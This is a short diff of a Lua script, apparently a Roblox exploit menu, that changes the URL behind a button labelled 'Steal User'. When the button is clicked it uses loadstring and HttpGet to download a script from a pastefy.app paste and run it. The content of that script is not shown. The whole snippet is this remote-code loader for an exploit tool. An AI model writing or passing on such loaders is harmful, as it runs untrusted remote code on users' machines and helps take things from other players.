@@ -18,7 +18,7 @@ Tab:AddButton({
     Name = "Steal User",
     Callback = function()
         local success, result = pcall(function()
-            loadstring(game:HttpGet("https://pastefy.app/WXSwotwy/raw"))()
+            loadstring(game:HttpGet("https://pastefy.app/wBhfmg9W/raw"))()
         end)
         if success then
             print("External script ran successfully.")
